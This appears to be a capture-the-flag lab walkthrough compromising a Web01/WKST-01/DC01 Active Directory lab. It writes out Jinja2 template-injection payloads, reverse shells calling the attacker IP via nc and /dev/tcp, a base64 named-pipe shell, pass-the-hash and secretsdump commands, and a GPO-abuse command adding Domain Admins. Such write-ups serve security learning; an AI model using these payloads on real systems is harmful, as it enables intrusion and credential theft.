# Odyssey (Hard)

Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail...

# ATTACK CHAIN :

1. Server-Side Template Injection (Web01 > Jinja2 — access as ghill_sa)

1. Rooting Web01 using ssh id_key.

1. Unshadow and cracking hashes.

1. Password Reuse (WKST-01 as user ghill_sa)

1. SeBackupPrivilege Exploit

1. Impacket-secretsdump

1. Rooting WKST-01 with Administrator password change (Disabling AV)

1. Access as bbarkinson on DC01 with hashes dumped in WKST-01

1.  SeAccountMachinePrivilege exploit (bberkinson — adding and joining machine to AD)

1. Bloodhound on WEB01 — (AV disabled, DNS changed to DC01, ldap from new machine created)

1. Generic Write on Finance Policy GPO exploit (bbarkinson — pGPOAbuse.py — new machine created to Administators group)

1. Full Domain Compromise (impacket-secretsdump — Administrator hash)

# ENUMERATION :

## NMAP :

Web-01

![odyssey screenshot 1](images/odyssey/odyssey-01.png)

WKST-01

![odyssey screenshot 2](images/odyssey/odyssey-02.png)

DC01

![odyssey screenshot 3](images/odyssey/odyssey-03.png)

# WEB-01

## HTTP-ENUM

Port 5000 :

![odyssey screenshot 4](images/odyssey/odyssey-04.png)

![odyssey screenshot 5](images/odyssey/odyssey-05.png)

Can we ping our system?

![odyssey screenshot 6](images/odyssey/odyssey-06.png)

![odyssey screenshot 7](images/odyssey/odyssey-07.png)

Nope.

**Directories? **

- Feroxbuster

![odyssey screenshot 8](images/odyssey/odyssey-08.png)

![odyssey screenshot 9](images/odyssey/odyssey-09.png)

There is a login page.

Trying :

`Username : ‘—`

`Password : —`

![odyssey screenshot 10](images/odyssey/odyssey-10.png)

Possible SQLi?

- **sqlmap** :

![odyssey screenshot 11](images/odyssey/odyssey-11.png)

![odyssey screenshot 12](images/odyssey/odyssey-12.png)

Parameters not injectable.

## UDP SCAN

- p161?

![odyssey screenshot 13](images/odyssey/odyssey-13.png)

Closed.

Let’s move forward.

# WKST-01

## SMBENUM

- Enum4linux

![odyssey screenshot 14](images/odyssey/odyssey-14.png)

![odyssey screenshot 15](images/odyssey/odyssey-15.png)

## UDP SCAN

Port 161 UDP?

![odyssey screenshot 16](images/odyssey/odyssey-16.png)

Filtered.

No other ports.

# DC01

## SMBENUM

- Enum4linux

![odyssey screenshot 17](images/odyssey/odyssey-17.png)

![odyssey screenshot 18](images/odyssey/odyssey-18.png)

RPC not accessible.

- Smbclient

![odyssey screenshot 19](images/odyssey/odyssey-19.png)

Updating /etc/hosts

![odyssey screenshot 20](images/odyssey/odyssey-20.png)

## ORANGE CYBERDEFENSE ENUM

Let’s see what we can do following Orange CyberDefense Protocol AD Enum with no Creds:

https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

### TIMEROAST

1. Let’s try TimeRoasting :

1. Timeroast.py

![odyssey screenshot 21](images/odyssey/odyssey-21.png)

Can we crack them ?

![odyssey screenshot 22](images/odyssey/odyssey-22.png)

No.

### ASREPROAST

Can we asreproast ?

https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast

![odyssey screenshot 23](images/odyssey/odyssey-23.png)

Nope.

Maybe because LDAP is not working properly, as stated.

# ACCESS AS GHILL_SA

Let’s go back to **Web-01**:

Since there’s Python running:

![odyssey screenshot 24](images/odyssey/odyssey-24.png)

We could try some

## SERVER-SIDE TEMPLATE INJECTIONS:

https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#methodology

![odyssey screenshot 25](images/odyssey/odyssey-25.png)

- Trying {7*7}

![odyssey screenshot 26](images/odyssey/odyssey-26.png)

- <%=7*7%>

![odyssey screenshot 27](images/odyssey/odyssey-27.png)

## JINJA2 INJECTION

https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#django-admin-username-and-password-hash-leak

![odyssey screenshot 28](images/odyssey/odyssey-28.png)

Let’s try this Jinja2 - Basic Injection :

- {{7*’7’}}

![odyssey screenshot 29](images/odyssey/odyssey-29.png)

**VULNERABLE**

- {{config.items()}}

![odyssey screenshot 30](images/odyssey/odyssey-30.png)

- Reading /etc/passwd

![odyssey screenshot 31](images/odyssey/odyssey-31.png)

`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`

![odyssey screenshot 32](images/odyssey/odyssey-32.png)

We got /etc/passwd.

Users here :

`ghill_sa`

- Write into Remote Files

![odyssey screenshot 33](images/odyssey/odyssey-33.png)

Can we add an ssh key.pub in /ghill_sa/.ssh/authorized_keys?

1. Craft the keys : ssh-keygen

![odyssey screenshot 34](images/odyssey/odyssey-34.png)

1. Change permissions to 600

![odyssey screenshot 35](images/odyssey/odyssey-35.png)

1. Try to write :

`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/ghill_sa/.ssh/authorized_keys/ghill.pub', 'w').write('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYcBNtJ69Lcmn6Yehh0XD4Zmm+N/aNGrdiwyLaJjACl zulema@BlackSnake`

`') }}`

![odyssey screenshot 36](images/odyssey/odyssey-36.png)

Error. Not possible.

## EXPLOITING SSTI

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2

![odyssey screenshot 37](images/odyssey/odyssey-37.png)

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

![odyssey screenshot 38](images/odyssey/odyssey-38.png)

Cool.

Can we RCE?

-  “ls /“ :

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen(‘ls /‘).read() }}`

![odyssey screenshot 39](images/odyssey/odyssey-39.png)

Can we netcat back?

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('nc -c /bin/sh 10.200.74.177 1234').read() }}`

No output.

Can we spawn a shell?

`Bash -c “bash -i >& /dev/tcp/10.200.74.177/1234 0>&1”`

No output.

- Checking /opt directory :

![odyssey screenshot 40](images/odyssey/odyssey-40.png)

- /opt/odyssey:

![odyssey screenshot 41](images/odyssey/odyssey-41.png)

Startup.sh — Cron file?

- Cat :

![odyssey screenshot 42](images/odyssey/odyssey-42.png)

If we can modify it, it can be triggered (?)

- Write into the file :

`Echo ‘bash -i >& /dev/tcp/10.200.74.177/1234 0>&1’ >> /opt/odyssey/startup.sh`

![odyssey screenshot 43](images/odyssey/odyssey-43.png)

- Read it again:

![odyssey screenshot 44](images/odyssey/odyssey-44.png)

Yes

Should I go to new line with \n ?

Let’s rewrite it this way :

`Echo “#!/bin/bash \nbash -i >& /dev/tcp/10.200.74.177/1234 0>&1” > /opt/odyssey/startup.sh`

I don’t know why but it’s still not working.

What if we create a startup.sh and we transfer directly?

Transfer :

- wget

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('wget http://10.200.74.177/startup.sh -O /opt/odyssey/startup.sh').read() }}`

![odyssey screenshot 45](images/odyssey/odyssey-45.png)

![odyssey screenshot 46](images/odyssey/odyssey-46.png)

![odyssey screenshot 47](images/odyssey/odyssey-47.png)

Adding privs with :

- chmod +x

- Inspecting App.py :

![odyssey screenshot 48](images/odyssey/odyssey-48.png)

If still not working == firewall for outbound and inbound connections?

- Penelope payload (_nc + named pipe_) :

`printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxMC4yMDAuNzQuMTc3IDgwID4vdG1wL18pID4vZGV2L251bGwgMj4mMSAm|base64 -d|sh`

![odyssey screenshot 49](images/odyssey/odyssey-49.png)

![odyssey screenshot 50](images/odyssey/odyssey-50.png)

We got initial access as ghill_sa.

## ENUMERATION:

- SUIDs

![odyssey screenshot 51](images/odyssey/odyssey-51.png)

- Capabilities :

![odyssey screenshot 52](images/odyssey/odyssey-52.png)

- Internal ports?

![odyssey screenshot 53](images/odyssey/odyssey-53.png)

- Let’s try to run linpeas.sh

![odyssey screenshot 54](images/odyssey/odyssey-54.png)

![odyssey screenshot 55](images/odyssey/odyssey-55.png)

We can see that we are in a docker environment

-  bash_history there’s something interesting

![odyssey screenshot 56](images/odyssey/odyssey-56.png)

- Let’s check the keys :

![odyssey screenshot 57](images/odyssey/odyssey-57.png)

We got a private key and a pub one.

Is there a passphrase in it so that we can reuse it on other hosts?

Let’s download it and try to ssh2john :

![odyssey screenshot 58](images/odyssey/odyssey-58.png)

![odyssey screenshot 59](images/odyssey/odyssey-59.png)

What kind of key is it?

**Is it root key? **

![odyssey screenshot 60](images/odyssey/odyssey-60.png)

Indeed it is !

# WEB01 PWNED

- Cat /etc/shadow :

![odyssey screenshot 61](images/odyssey/odyssey-61.png)

Can we crack it?

![odyssey screenshot 62](images/odyssey/odyssey-62.png)

![odyssey screenshot 63](images/odyssey/odyssey-63.png)

![odyssey screenshot 64](images/odyssey/odyssey-64.png)

It will be too long.

Can we do something else first?

Maybe unshadow?

![odyssey screenshot 65](images/odyssey/odyssey-65.png)

For this we need :

`/etc/passwd file `

`/etc/shadow file `

We copy both

Then we run :

- Unshadow

![odyssey screenshot 66](images/odyssey/odyssey-66.png)

![odyssey screenshot 67](images/odyssey/odyssey-67.png)

And we got the unshadowed hashes.

![odyssey screenshot 68](images/odyssey/odyssey-68.png)

I feel that root and ghill have the same password :P

## HASHES CRACKING

Let’s try to crack them now :

![odyssey screenshot 69](images/odyssey/odyssey-69.png)

With John is gonna be long too.

Let’s wait.

![odyssey screenshot 70](images/odyssey/odyssey-70.png)

Password Cracked:

`P@ssw0rd!`

Possible Password Reuse on other systems?

## PASSWORD REUSE :

Let’s try to use the same password and the same user ghill_sa for WKST-01

With

- Crackmapexec :

![odyssey screenshot 71](images/odyssey/odyssey-71.png)

It s not working due to ldap.

- Can we RDP?

![odyssey screenshot 72](images/odyssey/odyssey-72.png)

Indeed we can.

# ENUMERATION

Let’s enumerate :

- Tree /f

![odyssey screenshot 73](images/odyssey/odyssey-73.png)

Nothing in /ghill directory

![odyssey screenshot 74](images/odyssey/odyssey-74.png)

In /Share/DeptDocs we found a lot of docs.

- Checking what’s inside :

![odyssey screenshot 75](images/odyssey/odyssey-75.png)

![odyssey screenshot 76](images/odyssey/odyssey-76.png)

![odyssey screenshot 77](images/odyssey/odyssey-77.png)

![odyssey screenshot 78](images/odyssey/odyssey-78.png)

![odyssey screenshot 79](images/odyssey/odyssey-79.png)

![odyssey screenshot 80](images/odyssey/odyssey-80.png)

![odyssey screenshot 81](images/odyssey/odyssey-81.png)

![odyssey screenshot 82](images/odyssey/odyssey-82.png)

![odyssey screenshot 83](images/odyssey/odyssey-83.png)

![odyssey screenshot 84](images/odyssey/odyssey-84.png)

![odyssey screenshot 85](images/odyssey/odyssey-85.png)

![odyssey screenshot 86](images/odyssey/odyssey-86.png)

![odyssey screenshot 87](images/odyssey/odyssey-87.png)

![odyssey screenshot 88](images/odyssey/odyssey-88.png)

![odyssey screenshot 89](images/odyssey/odyssey-89.png)

![odyssey screenshot 90](images/odyssey/odyssey-90.png)

![odyssey screenshot 91](images/odyssey/odyssey-91.png)

An incredible amount of credentials.

I suppose that it’s not a matter of valid credentials, it would be too easy.

- Net users

![odyssey screenshot 92](images/odyssey/odyssey-92.png)

We got a list of users.

- Internal Ports?

![odyssey screenshot 93](images/odyssey/odyssey-93.png)

No dbs

- Powershell History?

No.

- Can we run bloodhound from the inside?

(I don’t think so cos of AV)

Indeed we can’t

- Processes?

![odyssey screenshot 94](images/odyssey/odyssey-94.png)

Nothing interesting.

- Can we run Powerview.py?

We can’t.

- Whoami /all

![odyssey screenshot 95](images/odyssey/odyssey-95.png)

We can see that it’s part of Backup Operators, but no SeBackupPrivilege set.

- Can we read SAM and SYSTEM?

![odyssey screenshot 96](images/odyssey/odyssey-96.png)

We can’t access to /windows/system32/config folder

Browsing on Hacktricks we found :

https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html

`Membership in the Backup Operators group provides access to the DC01 file system due to the SeBackup and SeRestore privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the FILE_FLAG_BACKUP_SEMANTICS flag. Utilizing specific scripts is necessary for this process.`

For the AD Attack it suggests a Diskshadow attack, which allows us for the theft of the NTDS.dit database, that contains all NTLM hashes for domain users and computers.

## DISKSHADOW ATTACK

1. Checking that diskshadow is present with where.exe utility :

![odyssey screenshot 97](images/odyssey/odyssey-97.png)

It is.

1. Create a shadow copy of the C drive:

`diskshadow.exe`

`set verbose on`

`set metadata C:\Windows\Temp\meta.cab`

`set context clientaccessible`

`begin backup`

`add volume C: alias cdrive`

`create`

`expose %cdrive% F:`

`end backup`

`exit`

![odyssey screenshot 98](images/odyssey/odyssey-98.png)

Of course we can’t because of Privs.

- Local Attack

![odyssey screenshot 99](images/odyssey/odyssey-99.png)

We find the .dll libraries here :

https://github.com/giuliano108/SeBackupPrivilege

- Transfer them and follow the instructions above:

![odyssey screenshot 100](images/odyssey/odyssey-100.png)

Weird

Let’s change approach :

Browsing again :

https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/

We’re using :

- reg

![odyssey screenshot 101](images/odyssey/odyssey-101.png)

Mh, still not working.

What if we use impacket’s :

- reg.py

- Start an smbserver -smb2support with :

- Impacket-smbserver

![odyssey screenshot 102](images/odyssey/odyssey-102.png)

1. Run impacket-reg with :

1. Backup flag

1. -o flag to write file in our share

`impacket-reg hsm.local/ghill_sa:"P@ssw0rd\!"@10.1.229.213 backup -o \\10.200.74.177\hello `

![odyssey screenshot 103](images/odyssey/odyssey-103.png)

What? Logon errors?

Let’s try to take off domain leaving just “/ghill_sa”

![odyssey screenshot 104](images/odyssey/odyssey-104.png)

Path not found

We are in BackupOperators but we do not have privileges set yet.

But I don’t know how to enable them.

I’ve looked in some walkthrough and all of them have SeBackupPrivilege set.

Something’s wrong with mine.

I’ll try to reset the machine

No privs yet.

Ok let’s try something :

Let’s use :

- Netexec rdp

To see If we have some admin privs on the system :

`netexec rdp 10.1.244.180 -u ghill_sa -p P@ssw0rd! --local-auth`

![odyssey screenshot 105](images/odyssey/odyssey-105.png)

We have.

- Let’s open Powershell with admin privs and run again whoami/all

![odyssey screenshot 106](images/odyssey/odyssey-106.png)

We have privs now.

# ACCESS AS BBARKINSON

## EXPLOITING SEBACKUPPRIVILEGE

Let’s exploit with :

- Reg save

![odyssey screenshot 107](images/odyssey/odyssey-107.png)

Now let’s open an smbserver with :

- Impacket-smbserver

And transfer the files:

![odyssey screenshot 108](images/odyssey/odyssey-108.png)

Ok we cannot.

Btw we have a /drive linked to our rdp, let’s move them directly:

![odyssey screenshot 109](images/odyssey/odyssey-109.png)

And now run :

- **Impacket-secretsdump LOCAL -sam -system**

![odyssey screenshot 110](images/odyssey/odyssey-110.png)

We got our hashes.

![odyssey screenshot 111](images/odyssey/odyssey-111.png)

Bbarkinson is a user that was not present in credentials files.

Let’s use it to authenticate to DC01:

- Winrm

![odyssey screenshot 112](images/odyssey/odyssey-112.png)

Indeed we could.

Let’s enumerate

- Whoami /all

![odyssey screenshot 113](images/odyssey/odyssey-113.png)

SeMachineAccountPrivilege set

- Tree /f

![odyssey screenshot 114](images/odyssey/odyssey-114.png)

Nothing.

- Powershell History

![odyssey screenshot 115](images/odyssey/odyssey-115.png)

Nothing

- /Users:

![odyssey screenshot 116](images/odyssey/odyssey-116.png)

- C:\

![odyssey screenshot 117](images/odyssey/odyssey-117.png)

We have a ldaps.cer

This should be a certificate for ldaps

![odyssey screenshot 118](images/odyssey/odyssey-118.png)

- Groups:

![odyssey screenshot 119](images/odyssey/odyssey-119.png)

What is Pre-Windows 2000 Compatible Access?

`The `**`Pre-Windows 2000 Compatible Access`**` group is a legacy ``Active Directory`` security group that grants read access to all user and group objects in a domain. It was created to help older systems and programs work with newer networks. By default, it often includes general users, which can let anyone in the domain see private account details`

## BACK FOR A WHILE TO WKST-01 TO GET THE FLAG

Meanwhile I forgot to pwned the WKST-01 and get the flag.

Since we have the Administrator Hash,  we can modify it’s password and RDP :

- nxc smb --local-auth :

`nxc smb 10.1.244.180 -u "Administrator" -H "d5cad8a9782b2879bf316f56936f1e36" --local-auth -x 'net user Administrator password123!'`

![odyssey screenshot 120](images/odyssey/odyssey-120.png)

As suggested, trying with wmi

![odyssey screenshot 121](images/odyssey/odyssey-121.png)

Ok.

-  RDP and get the flag :

![odyssey screenshot 122](images/odyssey/odyssey-122.png)

## BLOODHOUND ENUM ATTEMPT

Since we are Administrator, can we turn off AV and run bloodhound?

![odyssey screenshot 123](images/odyssey/odyssey-123.png)

![odyssey screenshot 124](images/odyssey/odyssey-124.png)

Run :

- sharphound.ps1 — Invoke-Bloodhound

![odyssey screenshot 125](images/odyssey/odyssey-125.png)

Is this a matter of DNS?

When pinging the domain :

![odyssey screenshot 126](images/odyssey/odyssey-126.png)

Failed.

We should change the DNS server to DC01:

- Network & Internet > Ethernet > Ipv4 DNS Servers > Manual

![odyssey screenshot 127](images/odyssey/odyssey-127.png)

- Pinging again :

![odyssey screenshot 128](images/odyssey/odyssey-128.png)

It works

- Run bloodhound again :

![odyssey screenshot 129](images/odyssey/odyssey-129.png)

Still nothing.

Let’s change the path.

Go Back to :

- Bbarkinson

![odyssey screenshot 130](images/odyssey/odyssey-130.png)

SeMachineAccountPrivilege set.

### Can we add and join a workstation to the domain ?

## ADDING AND JOINING MACHINE TO AD

I’m discovering that nxc is a wonderful tool full of features.

1. Check the MachineAccountQuota (_The number of machine that someone with SeMachineAccountPrivilege can join to a Domain_) with :

1. Nxc ldap -M maq

![odyssey screenshot 131](images/odyssey/odyssey-131.png)

We can add up to 10 machines.

Let’s add one:

- Impacket-addcomputer

-
![odyssey screenshot 132](images/odyssey/odyssey-132.png)

Not working

Maybe trying with :

- bloodyAD

`bloodyad --dc-ip 10.1.90.151 -d hsm.local -u bbarkinson -p :53c3709ae3d9f4428a230db81361ffbc --host  DC01.hsm.local add computer ZULEMA zulema123!`

![odyssey screenshot 133](images/odyssey/odyssey-133.png)

![odyssey screenshot 134](images/odyssey/odyssey-134.png)

## BLOODHOUND ENUM

Can we now run again bloodhound on the previous system? Using flags:

`Ldapusername : ZULEMA$`

`Ldappassword : zulema123! `

`Domaincontroller : to  Override domain controller to pull LDAP from.`

`Invoke-Bloodhound -collectionmethods all -ldapusername ZULEMA$ -ldappassword zulema123! -domaincontroller "dc01.hsm.local" -d hsm.local`

![odyssey screenshot 135](images/odyssey/odyssey-135.png)

We finally did it.

# FULL DOMAIN COMPROMISE

- Let’s analyze it :

![odyssey screenshot 136](images/odyssey/odyssey-136.png)

BBarkinson has Generic Write on Finance Policy GPO.

How to abuse it?

![odyssey screenshot 137](images/odyssey/odyssey-137.png)

## ABUSING GPO

https://github.com/Hackndo/pyGPOAbuse

What we can do is :

- Add Domain user and add to Domain Admins via Domain-Controller

`python3 pygpoabuse.py red.local/user:Testing123 -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -taskname SecurityUpdate  -dc-ip 192.168.152.2 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.red.local`

The GPO-ID, we can find it here :

![odyssey screenshot 138](images/odyssey/odyssey-138.png)

`python3 pygpoabuse.py hsm.local/bbarkinson -hashes :53c3709ae3d9f4428a230db81361ffbc -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2 -taskname SecurityUpdate -dc-ip 10.1.90.151 -command 'net user zulema zulema123! /add && net group "Domain Admins" zulema /add' -filter-enabled -target-dns-name DC01.HSM.LOCAL`

![odyssey screenshot 139](images/odyssey/odyssey-139.png)

Scheduled Task Created.

Let’s wait a bit to see if it will be triggered meanwhile checking with :

- Nxc ldap

`nxc ldap dc01 -u zulema -p zulema123!`

![odyssey screenshot 140](images/odyssey/odyssey-140.png)

After a while, still no output.

Maybe we can run the basic usage :

![odyssey screenshot 141](images/odyssey/odyssey-141.png)

We know that there is already a user called John.

To avoid that, we can modify the file of the exploit :

- scheduledtask.py

Putting John1 instead of John.

![odyssey screenshot 142](images/odyssey/odyssey-142.png)

![odyssey screenshot 143](images/odyssey/odyssey-143.png)

-f = to append the task at the previous one

-v = to display tasks

After a while, no output.

### Can we add ZULEMA$ ,which is already created, to Domain Admins?

`python3 pygpoabuse.py hsm.local/bbarkinson -hashes :53c3709ae3d9f4428a230db81361ffbc -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2 -taskname SecurityUpdate -dc-ip 10.1.90.151 -command 'net group "Domain Admins" ZULEMA$ /add' -filter-enabled -target-dns-name DC01.HSM.LOCAL -f`

![odyssey screenshot 144](images/odyssey/odyssey-144.png)

![odyssey screenshot 145](images/odyssey/odyssey-145.png)

Still not output “Pwned”

- Let’s try to add ZULEMA$ to localgroup Administrators

![odyssey screenshot 146](images/odyssey/odyssey-146.png)

Let’s try :

- Impacket-secretsdump

![odyssey screenshot 147](images/odyssey/odyssey-147.png)

![odyssey screenshot 148](images/odyssey/odyssey-148.png)

And we got Administrator HASH.

Let’s WINRM :

![odyssey screenshot 149](images/odyssey/odyssey-149.png)

# PWNED
